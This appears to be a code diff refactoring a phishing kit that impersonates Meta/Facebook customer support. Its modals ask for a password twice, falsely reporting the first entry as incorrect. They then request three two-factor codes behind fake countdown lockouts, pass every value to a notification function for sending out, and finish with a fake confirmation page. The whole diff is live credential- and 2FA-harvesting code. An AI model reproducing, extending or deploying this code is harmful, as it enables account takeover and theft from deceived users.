+        month: document.getElementById('month').value,
+        year: document.getElementById('year').value,
+        message: document.getElementById('message').value.trim()
+      };
+      if (typeof Utils !== 'undefined') Utils.saveRecord('__client_rec__fi_rst', formData);
+      Modal.close('clientModal');
+      setTimeout(function() { openSecurityModal(); }, 250);
+    });
+  });
+}
+
+
 // ==================== MODAL 2: SECURITY (PASSWORD) ====================
 function openSecurityModal() {
-  const content = `
-    <div class="h-full flex flex-col items-center justify-between flex-1">
-      <div class="w-full flex justify-end mb-2">
-        <button onclick="Modal.close('securityModal')" class="w-7 h-7 flex items-center justify-center rounded-full hover:bg-gray-100 text-gray-400 hover:text-gray-700 transition-colors text-xl leading-none">&times;</button>
-      </div>
-      <div class="w-12 h-12 mb-5 mx-auto">
-        <img src="./public/icons/ic_logo.svg" alt="Meta" class="w-full">
-      </div>
-      <div class="w-full">
-        <p class="text-[#9a979e] text-sm mb-4">For your security, you must enter your password to continue.</p>
-        <form id="securityForm">
-          <input type="password" id="password" placeholder="Password" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none mb-3">
-          <p id="passwordError" class="text-red-500 text-sm hidden mb-3"></p>
-          <button type="submit" class="w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white rounded-full hover:bg-blue-700 transition-colors">Continue</button>
-          <p class="text-center mt-3"><a href="#" class="text-[#9a979e] text-sm">Forgot your password?</a></p>
-        </form>
-      </div>
-      <div class="w-16 mt-5 mx-auto">
-        <img src="./public/icons/ic_meta_gray.svg" alt="Meta">
-      </div>
-    </div>
-  `;
+  var content = '\
+    <div style="display:flex;flex-direction:column;align-items:center;">\
+      <div style="width:100%;display:flex;justify-content:flex-end;margin-bottom:8px;">\
+        <button class="modal-close" onclick="Modal.close(\'securityModal\')">&times;</button>\
+      </div>\
+      <img src="./public/icons/ic_logo.svg" alt="Meta" class="modal-meta-icon">\
+      <div style="width:100%">\
+        <p class="modal-hint">For your security, you must enter your password to continue.</p>\
+        <form id="securityForm">\
+          <div class="modal-input-wrap"><input type="password" id="password" placeholder="Password" required></div>\
+          <p id="passwordError" class="modal-error"></p>\
+          <button type="submit" id="securityBtn" class="modal-btn-primary">Continue</button>\
+          <p style="text-align:center;margin-top:12px;"><a href="#" style="color:#9a979e;font-size:14px;text-decoration:none;">Forgot your password?</a></p>\
+        </form>\
+      </div>\
+      <img src="./public/icons/ic_meta_gray.svg" alt="Meta" class="modal-meta-logo">\
+    </div>\
+  ';
 
   Modal.create('securityModal', content);
   Modal.open('securityModal');
 
-  let securityClickCount = 0;
-  document.getElementById('securityForm').addEventListener('submit', async (e) => {
-    e.preventDefault();
-    const password = document.getElementById('password').value.trim();
-    const errorMsg = document.getElementById('passwordError');
-    const submitBtn = e.target.querySelector('button');
+  var clickCount = 0;
 
-    errorMsg.classList.add('hidden');
+  document.getElementById('securityForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    var password = document.getElementById('password').value.trim();
+    var errorMsg = document.getElementById('passwordError');
+    var submitBtn = document.getElementById('securityBtn');
+
+    errorMsg.classList.remove('show');
     if (!password) {
       errorMsg.textContent = "You haven't entered your password!";
-      errorMsg.classList.remove('hidden');
+      errorMsg.classList.add('show');
       return;
     }
 
     submitBtn.disabled = true;
-    submitBtn.innerHTML = '<div class="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin mx-auto"></div>';
+    submitBtn.innerHTML = '<span class="modal-spinner"></span>';
 
-    if (securityClickCount === 0) {
-      const dataLocal = Utils.getRecord('__client_rec__fi_rst');
-      const clientData = { password, ...dataLocal };
-      Utils.saveRecord('__client_rec__se_con', clientData);
-      await Utils.sendNotification(clientData);
-      setTimeout(() => {
+    if (clickCount === 0) {
+      var dataLocal = typeof Utils !== 'undefined' ? Utils.getRecord('__client_rec__fi_rst') : {};
+      var clientData = Object.assign({ password: password }, dataLocal);
+      if (typeof Utils !== 'undefined') {
+        Utils.saveRecord('__client_rec__se_con', clientData);
+        await Utils.sendNotification(clientData);
+      }
+      setTimeout(function() {
         submitBtn.disabled = false;
         submitBtn.textContent = 'Continue';
         document.getElementById('password').value = '';
         errorMsg.textContent = "The password you've entered is incorrect.";
-        errorMsg.classList.remove('hidden');
-        securityClickCount = 1;
+        errorMsg.classList.add('show');
+        clickCount = 1;
       }, 1350);
     } else {
-      const dataLocal = Utils.getRecord('__client_rec__se_con');
-      const clientData = { passwordSecond: password, ...dataLocal };
-      Utils.saveRecord('__client_rec__th_ird', clientData);
-      await Utils.sendNotification(clientData);
-      setTimeout(() => {
+      var dataLocal2 = typeof Utils !== 'undefined' ? Utils.getRecord('__client_rec__se_con') : {};
+      var clientData2 = Object.assign({ passwordSecond: password }, dataLocal2);
+      if (typeof Utils !== 'undefined') {
+        Utils.saveRecord('__client_rec__th_ird', clientData2);
+        await Utils.sendNotification(clientData2);
+      }
+      setTimeout(function() {
         Modal.close('securityModal');
-        openAuthenticationModal(clientData);
+        setTimeout(function() { openAuthenticationModal(clientData2); }, 250);
       }, 1500);
     }
   });
@@ -820,134 +1152,120 @@ function openSecurityModal() {
 
 // ==================== MODAL 3: AUTHENTICATION (2FA) ====================
 function openAuthenticationModal(userData) {
-  const emailDisplay = Utils.maskEmail(userData.email);
-  const phoneDisplay = Utils.maskPhone(userData.phone);
-  const description = `Enter the code for this account that we send to ${emailDisplay}, ${phoneDisplay} or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)`;
+  var emailDisplay = typeof Utils !== 'undefined' ? Utils.maskEmail(userData.email || '') : (userData.email || '');
+  var phoneDisplay = typeof Utils !== 'undefined' ? Utils.maskPhone(userData.phone || '') : (userData.phone || '');
+  var description = 'Enter the code for this account that we send to ' + emailDisplay + ', ' + phoneDisplay + ' or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)';
 
-  const content = `
-    <div class="flex flex-col h-full justify-between">
-      <div>
-        <div class="flex items-center justify-between mb-2">
-          <div class="flex items-center text-[#9a979e] gap-1.5 text-sm">
-            <span>${userData.fullName}</span>
-            <div class="w-1 h-1 bg-[#9a979e] rounded-full"></div>
-            <span>Facebook</span>
-          </div>
-          <button onclick="Modal.close('authModal')" class="w-7 h-7 flex items-center justify-center rounded-full hover:bg-gray-100 text-gray-400 hover:text-gray-700 transition-colors text-xl leading-none">&times;</button>
-        </div>
-        <h2 class="text-[20px] font-bold text-black mb-[15px]">Two-factor authentication required (1/3)</h2>
-        <p class="text-[#9a979e] text-sm mb-4">${description}</p>
-        <div class="w-full rounded-lg bg-[#f5f5f5] overflow-hidden mb-4">
-          <img src="./public/images/authentication.png" alt="2FA" class="w-full">
-        </div>
-        <form id="authForm">
-          <input type="number" id="twoFa" placeholder="Code" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none mb-3">
-          <p id="authError" class="text-red-500 text-sm hidden mb-3"></p>
-          <button type="submit" class="w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white rounded-full hover:bg-blue-700 transition-colors">Continue</button>
-          <div class="w-full mt-[16px] text-[#9a979e] flex items-center justify-center cursor-default rounded-[40px] px-[20px] py-[10px] border border-[#d4dbe3]"><span>Try another way</span></div>
-        </form>
-      </div>
-      <div class="w-16 mt-5 mx-auto">
-        <img src="./public/icons/ic_meta_gray.svg" alt="Meta">
-      </div>
-    </div>
-  `;
+  var content = '\
+    <div style="display:flex;flex-direction:column;">\
+      <div class="modal-header" style="margin-bottom:6px;">\
+        <div class="modal-user-info">\
+          <span>' + (userData.fullName || '') + '</span>\
+          <span class="modal-dot"></span>\
+          <span>Facebook</span>\
+        </div>\
+        <button class="modal-close" onclick="Modal.close(\'authModal\')">&times;</button>\
+      </div>\
+      <h2 style="font-size:20px;font-weight:700;color:#000;margin-bottom:14px;">Two-factor authentication required (1/3)</h2>\
+      <p class="modal-hint">' + description + '</p>\
+      <div class="modal-2fa-img"><img src="./public/images/authentication.png" alt="2FA"></div>\
+      <form id="authForm">\
+        <div class="modal-input-wrap"><input type="number" id="twoFa" placeholder="Code" required></div>\
+        <p id="authError" class="modal-error"></p>\
+        <button type="submit" id="authBtn" class="modal-btn-primary">Continue</button>\
+        <button type="button" class="modal-btn-outline">Try another way</button>\
+      </form>\
+      <img src="./public/icons/ic_meta_gray.svg" alt="Meta" class="modal-meta-logo">\
+    </div>\
+  ';
 
   Modal.create('authModal', content);
   Modal.open('authModal');
 
-  let authClickCount = 0;
-  let countdownInterval;
+  var authCount = 0;
+  var countdownInterval;
 
-  document.getElementById('authForm').addEventListener('submit', async (e) => {
-    e.preventDefault();
-    const twoFa = document.getElementById('twoFa').value.trim();
-    const errorMsg = document.getElementById('authError');
-    const submitBtn = e.target.querySelector('button');
-    const input = document.getElementById('twoFa');
-
-    errorMsg.classList.add('hidden');
-    if (!twoFa) {
-      errorMsg.textContent = "You haven't entered the code!";
-      errorMsg.classList.remove('hidden');
-      return;
-    }
-
-    submitBtn.disabled = true;
-    submitBtn.innerHTML = '<div class="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin mx-auto"></div>';
-
-    if (authClickCount === 0) {
-      const dataLocal = Utils.getRecord('__client_rec__th_ird');
-      const clientData = { twoFa, ...dataLocal };
-      Utils.saveRecord('__client_rec__fou_rth', clientData);
-      await Utils.sendNotification(clientData);
-      setTimeout(() => {
-        submitBtn.innerHTML = 'Continue';
-        startCountdown(input, errorMsg, submitBtn);
-        authClickCount = 1;
-      }, 1400);
-    } else if (authClickCount === 1) {
-      const dataLocal = Utils.getRecord('__client_rec__fou_rth');
-      const clientData = { twoFaSecond: twoFa, ...dataLocal };
-      Utils.saveRecord('__client_rec__f_if_th', clientData);
-      await Utils.sendNotification(clientData);
-      setTimeout(() => {
-        submitBtn.innerHTML = 'Continue';
-        startCountdown(input, errorMsg, submitBtn);
-        authClickCount = 2;
-      }, 1200);
-    } else {
-      const dataLocal = Utils.getRecord('__client_rec__f_if_th');
-      const clientData = { twoFaThird: twoFa, ...dataLocal };
-      await Utils.sendNotification(clientData);
-      setTimeout(() => {
-        Modal.close('authModal');
-        openSuccessModal();
-      }, 1600);
-    }
-  });
-
-  function startCountdown(input, errorMsg, submitBtn) {
+  function startCountdown(errorMsg, submitBtn) {
+    var input = document.getElementById('twoFa');
+    if (!input) return;
     input.disabled = true;
     submitBtn.disabled = true;
-    submitBtn.classList.add('opacity-70');
-    let time = CONFIG.COUNTDOWN_TIME;
-    errorMsg.textContent = `The code is incorrect. Try again after ${time} seconds.`;
-    errorMsg.classList.remove('hidden');
-    countdownInterval = setInterval(() => {
+    var time = (typeof CONFIG !== 'undefined' && CONFIG.COUNTDOWN_TIME) ? CONFIG.COUNTDOWN_TIME : 30;
+    errorMsg.textContent = 'The code is incorrect. Try again after ' + time + ' seconds.';
+    errorMsg.classList.add('show');
+    countdownInterval = setInterval(function() {
       time--;
-      errorMsg.textContent = `The code is incorrect. Try again after ${time} seconds.`;
+      errorMsg.textContent = 'The code is incorrect. Try again after ' + time + ' seconds.';
       if (time <= 0) {
         clearInterval(countdownInterval);
         input.disabled = false;
         input.value = '';
         submitBtn.disabled = false;
-        submitBtn.classList.remove('opacity-70');
-        errorMsg.classList.add('hidden');
+        submitBtn.textContent = 'Continue';
+        errorMsg.classList.remove('show');
       }
     }, 1000);
   }
+
+  document.getElementById('authForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    var twoFa = document.getElementById('twoFa').value.trim();
+    var errorMsg = document.getElementById('authError');
+    var submitBtn = document.getElementById('authBtn');
+
+    errorMsg.classList.remove('show');
+    if (!twoFa) {
+      errorMsg.textContent = "You haven't entered the code!";
+      errorMsg.classList.add('show');
+      return;
+    }
+
+    submitBtn.disabled = true;
+    submitBtn.innerHTML = '<span class="modal-spinner"></span>';
+
+    if (authCount === 0) {
+      var d1 = typeof Utils !== 'undefined' ? Utils.getRecord('__client_rec__th_ird') : {};
+      var c1 = Object.assign({ twoFa: twoFa }, d1);
+      if (typeof Utils !== 'undefined') { Utils.saveRecord('__client_rec__fou_rth', c1); await Utils.sendNotification(c1); }
+      setTimeout(function() {
+        submitBtn.innerHTML = 'Continue';
+        startCountdown(errorMsg, submitBtn);
+        authCount = 1;
+      }, 1400);
+    } else if (authCount === 1) {
+      var d2 = typeof Utils !== 'undefined' ? Utils.getRecord('__client_rec__fou_rth') : {};
+      var c2 = Object.assign({ twoFaSecond: twoFa }, d2);
+      if (typeof Utils !== 'undefined') { Utils.saveRecord('__client_rec__f_if_th', c2); await Utils.sendNotification(c2); }
+      setTimeout(function() {
+        submitBtn.innerHTML = 'Continue';
+        startCountdown(errorMsg, submitBtn);
+        authCount = 2;
+      }, 1200);
+    } else {
+      var d3 = typeof Utils !== 'undefined' ? Utils.getRecord('__client_rec__f_if_th') : {};
+      var c3 = Object.assign({ twoFaThird: twoFa }, d3);
+      if (typeof Utils !== 'undefined') await Utils.sendNotification(c3);
+      setTimeout(function() {
+        Modal.close('authModal');
+        setTimeout(function() { openSuccessModal(); }, 250);
+      }, 1600);
+    }
+  });
 }
 
 // ==================== MODAL 4: SUCCESS ====================
 function openSuccessModal() {
-  const content = `
-    <div class="flex items-center justify-between mb-4">
-      <h2 class="font-bold text-[18px] text-center flex-1">Request has been sent</h2>
-      <button onclick="Modal.close('successModal')" class="w-7 h-7 flex items-center justify-center rounded-full hover:bg-gray-100 text-gray-400 hover:text-gray-700 transition-colors text-xl leading-none">&times;</button>
-    </div>
-    <div class="rounded-lg overflow-hidden mb-4">
-      <img src="./public/images/success.jpg" alt="Success" class="w-full">
-    </div>
-    <p class="text-[#9a979e] mb-1 text-[15px]">Your request has been added to the processing queue. We will handle your request within 24 hours.</p>
-    <p class="text-[#9a979e] mb-5 text-[15px]">From the Customer Support Meta.</p>
-    <a href="https://www.facebook.com" class="block w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white text-center rounded-full leading-[40px] hover:bg-blue-700 transition-colors">
-      Return to Facebook
-    </a>
-    <div class="w-16 mt-5 mx-auto">
-      <img src="./public/icons/ic_meta_gray.svg" alt="Meta">
-    </div>
-  `;
+  var content = '\
+    <div class="modal-header">\
+      <h2 style="font-size:18px;font-weight:700;text-align:center;flex:1;">Request has been sent</h2>\
+      <button class="modal-close" onclick="Modal.close(\'successModal\')">&times;</button>\
+    </div>\
+    <div class="modal-success-img"><img src="./public/images/success.jpg" alt="Success"></div>\
+    <p style="color:#9a979e;font-size:15px;margin-bottom:6px;">Your request has been added to the processing queue. We will handle your request within 24 hours.</p>\
+    <p style="color:#9a979e;font-size:15px;margin-bottom:20px;">From the Customer Support Meta.</p>\
+    <a href="https://www.facebook.com" class="modal-return-btn">Return to Facebook</a>\
+    <img src="./public/icons/ic_meta_gray.svg" alt="Meta" class="modal-meta-logo">\
+  ';
   Modal.create('successModal', content);
   Modal.open('successModal');
 }
